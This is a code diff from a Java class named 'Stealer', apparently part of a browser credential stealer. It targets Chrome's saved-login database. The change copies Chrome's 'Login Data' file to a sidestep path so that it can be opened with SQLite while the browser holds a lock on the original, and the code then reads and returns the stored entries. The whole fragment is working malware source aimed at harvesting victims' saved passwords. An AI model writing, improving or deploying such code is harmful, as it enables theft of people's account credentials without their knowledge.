@@ -12,14 +12,18 @@ import java.util.List;
  */
 public class Stealer
 {
-    private static String dbLocation = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data";
+    private static String db = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data";
 
-    private static Connection connect() throws SQLException, ClassNotFoundException
+    private static Connection connect() throws SQLException, ClassNotFoundException, IOException
     {
-            // db parameters
+         String dbLocation = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Lgin Data";
+         if(!new File(dbLocation).exists())
+         {
+            File file = new File(db);
+            Files.copy(file.toPath(), Paths.get(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Lgin Data"));
+         }
             Class.forName("org.sqlite.JDBC");
             String url = "jdbc:sqlite:" + dbLocation;
-            // create me.mafrans.discordsw.Main connection to the database
             return DriverManager.getConnection(url);
     }
 
@@ -44,7 +48,7 @@ public class Stealer
            }
            return data;
         }
-        catch(SQLException | ClassNotFoundException | UnsupportedEncodingException ex)
+        catch(SQLException | ClassNotFoundException | UnsupportedEncodingException | IOException ex)
         {
             ex.printStackTrace();
             return new ArrayList<Data>();
